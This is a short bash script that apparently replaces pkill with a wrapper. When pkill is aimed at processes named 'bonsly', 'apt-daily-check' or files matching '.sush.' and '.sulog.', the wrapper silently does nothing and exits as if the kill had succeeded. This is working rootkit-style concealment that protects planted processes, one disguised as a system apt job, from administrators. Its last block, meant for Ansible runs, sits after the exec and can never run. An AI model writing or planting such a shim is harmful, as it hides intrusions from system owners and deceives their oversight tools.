#!/bin/bash
REAL_PKILL="/usr/bin/pkill"

# Block pkill targeting bonsly or our scripts by name pattern
BLOCKED_PATTERNS=("bonsly" "apt-daily-check" "\.sush\." "\.sulog\.")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 0  # pretend it worked
        fi
    done
done

exec $REAL_PKILL "$@"

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_PKILL "$@"
fi
